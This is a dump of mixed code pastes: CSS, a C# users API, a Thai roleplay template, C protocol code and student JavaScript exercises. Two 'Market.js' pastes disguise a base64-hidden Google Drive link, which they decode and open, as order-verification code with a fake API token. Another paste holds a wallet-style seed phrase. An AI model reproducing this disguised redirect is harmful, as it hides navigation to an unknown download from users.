#timerInner.topLeftOld {
background-color: transparent;
} 

#timerHolder.topLeftOld {
background-color: rgba(0,0,0,.5);
border-radius: 5px 5px 5px 5px;
}

#timerVal.topLeftOld {
font-size: 45px !important;
text-shadow: -1px -1px 0 #202020,1px -1px 0 #202020,-1px 1px 0 #202020,1px 1px 0 #202020
}




/* Chat */

#chatInput {
font-size: 25px;
max-width: 275px;
transform: translateX(-31%);
background-color: transparent;
border: transparent;
}


.chatItem {
font-size: 15px;
padding-right: 5px;
max-width: 275px;
background-color: transparent;
border: transparent;
}

#chatList {
background-color: transparent;
}


/*Matchinfo*/

#matchInfo {
visibility: hidden !important;
}
#matchInfo:after {
font-size:12px;
content: var(--Watermark);
color: #ffffff;
opacity: 100%;
text-shadow: 0 0 2px #000000;
visibility: visible !important;
position: fixed;
top: 100px;
left: calc(1%);
text-shadow: -1px -1px 0 #202020,1px -1px 0 #202020,-1px 1px 0 #202020,1px 1px 0 #202020
}"
CcNyv81m,Untitled,drakon-firestone,C#,Wednesday 9th of April 2025 09:08:22 AM CDT,"using Backend.Data;
using Backend.Models;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;


namespace Backend.Controllers
{

    [ApiController]
    [Route(""api/[controller]"")]
    public class UsersController : ControllerBase
    {
        private readonly ApplicationDbContext _context;

        public UsersController(ApplicationDbContext context)
        {
            _context = context;
        }

        [HttpGet]
        public async Task<ActionResult<IEnumerable<User>>> GetUsers()
        {
            var users = await _context.Users.ToListAsync();
            return Ok(users);
        }

        [HttpGet(""{id}"")]
        public async Task<ActionResult<User>> GetUser(int id)
        {
            var user = await _context.Users.FindAsync(id);

            if(user == null)
            {
                return NotFound();
            }

            return Ok(user);
        }

        [HttpPost]
        public async Task<ActionResult<User>> PostUser(User user)
        {
            if (user == null)
            {
                return BadRequest(""User data is required"");
            }
            
            try
            {
                _context.Users.Add(user);
                await _context.SaveChangesAsync();

                return CreatedAtAction(""GetUser"", new {id = user.Id }, user);
            }
            catch (Exception ex)
            {
                return StatusCode(500, ""En error occured while creatint user. Try again later"");
            }
        }

        [HttpPut(""{id}"")]
        public async Task<IActionResult> PutUser(int id, User user)
        {
            if (id != user.Id)
            {
                return BadRequest();
            }
            
            _context.Entry(user).State = EntityState.Modified;
            
            try
            {
                await _context.SaveChangesAsync();
            }
            catch (DbUpdateConcurrencyException)
            {
                if (!UserExists(id))
                {
                    return NotFound();
                }
                else
                {
                    throw;
                }
            }
            return NoContent();
        }
        
        private bool UserExists(int id)
        {
            return _context.Users.Any(e => e.Id == id);
        }

    }

}"
eqzKxAai,West World : Roleplay,Kelly-B9978,HTML,Wednesday 9th of April 2025 08:59:42 AM CDT,"<!--
[คู่มือการแก้ไขโคด]
สีดาว : --west-primary: #B87333;

ตำแหน่งภาพ : เพิ่ม --west-pos: 50% 50%; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - เลขตัวแรกคือการขยับซ้าย - ขวา โดย 0% = ชิดซ้าย 100% = ชิดขวา
 - เลขตัวแรกคือการขยับขึ้น - ลง โดย 0% = ชิดบน 100% = ชิดล่าง
 
ขนาดภาพ : เพิ่ม --west-size: cover; ต่อท้ายลิงก์รูปที่ต้องการปรับ
 - cover คือ ขยายเต็มพื้นที่
 - 100% คือ ขนาดเดิมของรูป
 - มากกว่า 100% คือ ขนาดใหญ่ขึ้น
 - น้อยกว่า 100% คือ ขนาดเล็กลง
-->

<link href=""https://dl.dropbox.com/scl/fi/ubghi6edr8wu7rh93inuu/west-world.css?rlkey=2zbqf4yxybassc685mj08ugtq&st=f9qgdzp5"" rel=""stylesheet"">
<div id=""WestWorld""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""west-box"" id=""west-role"">
<div class=""west-bg"" style=""--west-primary: #B87333;"">
<div class=""west-bd""><tpl></tpl><tpr></tpr><btl></btl><btr></btr>
<div class=""west-pic"" style=""--west-pic: url(--ลิงก์รูปภาพ--);""></div>
<div class=""west-title"">
<div class=""west-name"">--ชื่อตัวละคร--</div>
<div class=""west-sub-name"">--ข้อความ--</div>
</div>
<hr class=""west-star"">
<div class=""west-content"">
--เนื้อหาโรลเพลย์--
</div>
<hr class=""west-star"">
<div class=""west-ps"">[b]หมายเหตุ[/b] --หมายเหตุ--</div>
</div></div></div></div>"
qx2mcMhb,Untitled,dtorkin,C,Wednesday 9th of April 2025 08:56:47 AM CDT,"// Получает полное протокольное сообщение из интерфейса
int receive_protocol_message(IOInterface *io, int handle, Message *message) {
    if (!io || !io->receive_data || handle < 0 || !message) {
        fprintf(stderr, ""receive_protocol_message: Invalid arguments\n"");
        return -1;
    }

    MessageHeader header_net;
    ssize_t bytesRead;
    size_t totalBytesRead;

    // --- Этап 1: Чтение заголовка ---
    totalBytesRead = 0;
    while (totalBytesRead < sizeof(MessageHeader)) {
        bytesRead = io->receive_data(handle, ((char*)&header_net) + totalBytesRead, sizeof(MessageHeader) - totalBytesRead);

        if (bytesRead < 0) {
            // -2 означает таймаут/прерывание poll/EINTR read - просто повторяем попытку
            if (bytesRead == -2 || errno == EINTR) {
                 errno = 0; // Сбрасываем errno для EINTR
                 usleep(10000); // Небольшая пауза перед повтором
                 continue;
            }
            // Другая ошибка чтения
            fprintf(stderr, ""receive_protocol_message: Ошибка получения заголовка (io->receive_data вернул %zd, errno %d: %s)\n"",
                    bytesRead, errno, strerror(errno));
            return -1; // Критическая ошибка
        } else if (bytesRead == 0) {
            // Для TCP это точно закрытие. Для Serial - маловероятно, но тоже обработаем как закрытие.
             printf(""receive_protocol_message: Соединение закрыто при чтении заголовка (получено 0 байт).\n"");
             return 1; // Соединение закрыто
        }
        // Данные получены
        totalBytesRead += bytesRead;
    }
    // Заголовок прочитан успешно

    memcpy(&message->header, &header_net, sizeof(MessageHeader));

    // --- Этап 2: Преобразование длины тела и чтение тела ---
    uint16_t bodyLenNet = message->header.body_length;
    uint16_t bodyLenHost = ntohs(bodyLenNet);

    if (bodyLenHost > MAX_MESSAGE_BODY_SIZE) {
        fprintf(stderr, ""receive_protocol_message: Ошибка: Полученная длина тела (%u) > MAX (%d).\n"", bodyLenHost, MAX_MESSAGE_BODY_SIZE);
        return -1;
    }

    if (bodyLenHost > 0) {
        totalBytesRead = 0;
        while (totalBytesRead < bodyLenHost) {
             bytesRead = io->receive_data(handle, message->body + totalBytesRead, bodyLenHost - totalBytesRead);
             if (bytesRead < 0) {
                 if (errno == EINTR || bytesRead == -2) {
                     errno = 0;
                     usleep(10000);
                     continue; // Повторить попытку
                 }
                fprintf(stderr, ""receive_protocol_message: Ошибка получения тела сообщения (io->receive_data вернул %zd, errno %d: %s)\n"",
                        bytesRead, errno, strerror(errno));
                return -1; // Критическая ошибка
             } else if (bytesRead == 0) {
                  // Для TCP это закрытие. Для Serial может означать, что просто больше нет данных *сейчас*.
                  // Однако, если мы ожидаем тело определенной длины, а получили 0, это проблема.
                  fprintf(stderr, ""receive_protocol_message: Соединение закрыто при чтении тела (получено 0 байт, ожидалось %u).\n"", (unsigned int)(bodyLenHost - totalBytesRead));
                  return 1; // Считаем соединение закрытым
             }
            totalBytesRead += bytesRead;
        }
    }
    // Тело прочитано успешно

    // --- Этап 3: Преобразование всего сообщения в хост-порядок ---
    message->header.body_length = bodyLenNet;
    message_to_host_byte_order(message);

    printf(""Получено сообщение через %s: Тип=%u, Номер=%u, Длина тела=%u, Handle=%d\n"",
           (io->type == IO_TYPE_ETHERNET) ? ""Ethernet"" : ((io->type == IO_TYPE_SERIAL) ? ""Serial"" : ""Unknown""),
           message->header.message_type,
           get_full_message_number(&message->header),
           message->header.body_length,
           handle);

    return 0; // Успех
}"
NFwSqmJZ,03-StockFlow-Resources,Onesible,JavaScript,Wednesday 9th of April 2025 08:55:16 AM CDT,"const url = `http://localhost:3030/jsonstore/orders/`;

const ordersList = document.getElementById('list');
const orderBtn = document.getElementById('order-btn');
const editBtn = document.getElementById('edit-order');

const stockName = document.getElementById('name');
const stockQuantity = document.getElementById('quantity');
const orderDate = document.getElementById('date');

function attachEvents() {
    document.getElementById('load-orders').addEventListener('click', loadOrders);
    orderBtn.addEventListener('click', onOrder);
    editBtn.addEventListener('click', onEdit);
}

async function onLoad() {
    let res = await fetch(url);
    let data = await res.json();

    return Object.values(data);
}

async function loadOrders() {
    let orders = await onLoad();
    ordersList.replaceChildren();

    orders.forEach(order => {
        let changeBtn = create('button', ['Change'], 'change-btn');
        let doneBtn = create('button', ['Done'], 'done-btn');

        changeBtn.addEventListener('click', () => onChange(order._id, order.name, order.quantity, order.date));
        doneBtn.addEventListener('click', () => onDone(order._id));

        ordersList.appendChild(
            create('li', [
                create('div', [
                    create('h2', [order.name]),
                    create('h3', [order.date]),
                    create('h3', [order.quantity]),
                    changeBtn,
                    doneBtn
                ], 'container')
            ], 'appointment')
        );
    })
}

async function onOrder(e) {
    e.preventDefault();

    let options = {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            name: stockName.value,
            quantity: stockQuantity.value,
            date: orderDate.value
        })
    }

    e.target.parentElement.reset();

    await fetch(url, options);
    loadOrders();
}

function onChange(id, name, quantity, date) {
    stockName.value = name;
    stockQuantity.value = quantity;
    orderDate.value = date;

    editBtn.dataset.id = id;
    editBtn.disabled = false;
    orderBtn.disabled = true;
}

async function onEdit(e) {
    e.preventDefault();

    let options = {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            _id: e.target.dataset.id,
            name: stockName.value,
            quantity: stockQuantity.value,
            date: orderDate.value
        })
    }

    editBtn.disabled = true;
    orderBtn.disabled = false;

    e.target.parentElement.reset();

    await fetch(url + e.target.dataset.id, options);
    loadOrders();
}

async function onDone(id) {
    await fetch(url + id, { method: 'DELETE' })
    loadOrders();
}

function create(tag, children, className) {
    let el = document.createElement(tag);
    if (className) {
        el.className = className;
    }
    children.forEach(child => {
        if (typeof child === 'object') {
            el.appendChild(child);
        } else {
            el.appendChild(document.createTextNode(child));
        }
    });

    return el;
}

attachEvents();"
xG6pi8wR,Untitled,Hasli4,Python,Wednesday 9th of April 2025 08:45:49 AM CDT,"#В программе уже дана функция get_course(), получающая #предпочтение и возвращающая факультатив. 
#Допиши основную часть с вводом числа учеников, которым #нужно порекомендовать курсы. Запроси у каждого #предпочтение и в ответ напечатай факультатив.
#При печати рекомендаций проверьте, есть ли среди них #астрономия. Если есть, то напечатайте дополнительное #сообщение: «Будьте внимательны! Занятия проходят #ночью!»
#Программа должна работать как на картинке. # https://ibb.co/PGK4q5zM

def get_course(wish):
    if wish.find('спорт') != -1:
        course = 'волейбол'
    elif wish.find('наука') != -1:
        course = 'астрономия'
    elif wish.find('комиксы') != -1:
        course = 'скетчинг'
    else:
        course = 'история Древнего Рима'
    return course

"
UgZsC1wa,asd,carlosmfp,Python,Wednesday 9th of April 2025 08:45:08 AM CDT,business barely fault flush ripple crawl unhappy brisk acoustic praise thumb protect join range squirrel trend dutch assist trap blue pumpkin pet size elephant luxury
VwL3PqqB,MovablePoint,ivorakitin,Java,Wednesday 9th of April 2025 08:41:28 AM CDT,"public class Main {

    public static void main(String[] args) {
        MouseMover mm = new MouseMover(800, 600);
        System.out.printf(""Screen size is w:%d h:%d\n"", mm.getWidth(), mm.getHeight());
        System.out.printf(""Mouse position is X:%d Y:%d\n"", mm.getX(), mm.getY());
        while (mm.moveUp() && mm.moveLeft()) {
            System.out.printf(""Mouse position is X:%d Y:%d\n"", mm.getX(), mm.getY());
        }
        System.out.println(""Changing directions..."");
        while (mm.moveDown() && mm.moveRight()) {
            System.out.printf(""Mouse position is X:%d Y:%d\n"", mm.getX(), mm.getY());
        }
    }
}"
X1Xzs611,02-Event-Tracker-Resources,Onesible,JavaScript,Wednesday 9th of April 2025 08:34:01 AM CDT,"function solve() {
    let saveBtn = document.getElementById('save');
    saveBtn.addEventListener('click', onSave);
    document.querySelector('.delete').addEventListener('click', onDelete);

    let upcomingEvents = document.getElementById('upcoming-list');
    let eventList = document.getElementById('events-list');

    let name = document.getElementById('event');
    let note = document.getElementById('note');
    let date = document.getElementById('date');

    function onSave(e) {
        e.preventDefault();

        let currName = name.value;
        let currNote = note.value;
        let currDate = date.value;
        
        if (!currName || !currNote || !currDate) {
            return;
        }

        let editBtn = create('button', ['Edit'], 'btn edit');
        let doneBtn = create('button', ['Done'], 'btn done');

        editBtn.addEventListener('click', (e) => onEdit(e, currName, currNote, currDate));
        doneBtn.addEventListener('click', onDone);

        let li = create('li', [
            create('div', [
                create('article', [
                    create('p', [`Name: ${currName}`]),
                    create('p', [`Note: ${currNote}`]),
                    create('p', [`Date: ${currDate}`])
                ]),
                create('div', [
                    editBtn,
                    doneBtn
                ], 'buttons')
            ], 'event-container')
        ], 'event-item');

        upcomingEvents.appendChild(li);

        e.target.parentElement.reset();
    }

    function onEdit(e, eventName, eventNote, eventDate) {
        name.value = eventName;
        note.value = eventNote;
        date.value = eventDate;

        e.target.closest('li').remove();
    }

    function onDone(e) {
        let li = e.target.closest('li')

        li.querySelector('.buttons').remove();
        eventList.appendChild(li);
    }

    function onDelete() {
        eventList.replaceChildren();
    }

    function create(tag, children, className) {
        let el = document.createElement(tag);
        if (className) {
            el.className = className;
        }
        children.forEach(child => {
            if (typeof child === 'object') {
                el.appendChild(child);
            } else {
                el.appendChild(document.createTextNode(child));
            }
        });

        return el;
    }
}"
FrXbZqCq,Market.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 08:08:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19287/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1ZhNRNhE,03.StockFlow,Kamend1,JavaScript,Wednesday 9th of April 2025 07:58:43 AM CDT,"function orderTracker () {
    let baseUrl = `http://localhost:3030/jsonstore/orders/`;
    let orderList = document.getElementById('list');

    let orderNameField = document.getElementById('name');
    let orderQuantityField = document.getElementById('quantity');
    let orderDateField = document.getElementById('date');

    let loadBtn = document.getElementById('load-orders');
    loadBtn.addEventListener('click', getOrders);

    let orderBtn = document.getElementById('order-btn');
    orderBtn.addEventListener('click', function(e) {
        e.preventDefault();
        createOrder();
    })

    let editBtn = document.getElementById('edit-order');
    editBtn.addEventListener('click', function(e) {
        e.preventDefault();
        updateOrder();
    })

    function onChange (event) {
        let currentOrderElement = event.target.parentElement
        let currentOrderID = event.target.dataset.id

        let currentOrderName = currentOrderElement.querySelector('h2').textContent;
        let currentOrderQty = currentOrderElement.querySelector('h3:last-of-type').textContent;
        let currentOrderDate = currentOrderElement.querySelector('h3:first-of-type').textContent;

        orderNameField.value = currentOrderName;
        orderQuantityField.value = currentOrderQty;
        orderDateField.value = currentOrderDate;

        orderBtn.disabled = true;
        editBtn.dataset.id = currentOrderID;
        editBtn.disabled = false;

        currentOrderElement.remove()
    }

    async function getOrders() {

        let response = await fetch(baseUrl);
        let data = await response.json();

        let orders = Object.values(data);

        for (let order of orders) {
            let stockName = order.name;
            let quantity = order.quantity;
            let date = order.date;

            let nameElement = createElement('h2', stockName);
            let dateElement = createElement('h3', date);
            let quantityElement = createElement('h3', quantity);
            
            let changeBtn = createElement('button', 'Change', { class: 'change-btn'});
            changeBtn.dataset.id = order._id;
            changeBtn.addEventListener('click', onChange);
             
            let doneBtn = createElement('button', 'Done', { class: 'done-btn'});
            doneBtn.dataset.id = order._id;
            doneBtn.addEventListener('click', function () {
                deleteOrder(doneBtn.dataset.id);
            });
            
            let containerDiv = createElement('div', null, { class: 'container'}, nameElement, dateElement, quantityElement, changeBtn, doneBtn);
            orderList.appendChild(containerDiv);
        }
    }

    async function createOrder() {
        let newOrderName = orderNameField.value;
        let newOrderQty = orderQuantityField.value;
        let newOrderDate = orderDateField.value;

        let newOrder = {
            name: newOrderName,
            date: newOrderDate,
            quantity: newOrderQty,
        }

        let options = {
            method: 'post',
            headers: { 'Content-type': 'application/json' },
            body: JSON.stringify(newOrder),
        }

        orderList.replaceChildren();
        await fetch (baseUrl, options);

        orderNameField.value = '';
        orderQuantityField.value = '';
        orderDateField.value = '';

        getOrders();
    }

    async function updateOrder() {
        orderList.replaceChildren();
        
        let updateId = editBtn.dataset.id

        let updatedOrder = {
            name: orderNameField.value,
            date: orderDateField.value,
            quantity: orderQuantityField.value,
            _id: updateId,
        }

        let options = {
            method: 'put',
            headers: { 'Content-type': 'application/json' },
            body: JSON.stringify(updatedOrder),
        }

        await fetch (baseUrl + updateId, options);

        editBtn.dataset.id = '';
        editBtn.disabled = true;
        orderBtn.disabled = false;

        orderNameField.value = '';
        orderDateField.value = '';
        orderQuantityField.value = '';

        getOrders();
    }

    async function deleteOrder(id) {
        options = {
            method: 'delete',
        }
        
        orderList.replaceChildren();
        await fetch (baseUrl + id, options);

        getOrders();
    }
}

function createElement(type, content, attributes = {}, ...children) {
    let element = document.createElement(type);

    if (content) {
        element.textContent = content;
    }

    for (let attr in attributes) {
        if (attr === 'class') {
            element.classList.add(...attributes[attr].split(' '));
        } else {
            element.setAttribute(attr, attributes[attr]);
        }
    }

    for (let child of children) {
        if (typeof child === 'string') {
            child = document.createTextNode(child);
        }
        element.appendChild(child);
    }

    return element;
}

orderTracker();"
0C1KEPMp,Untitled,SpawnKz,JavaScript,Wednesday 9th of April 2025 07:53:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32982/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
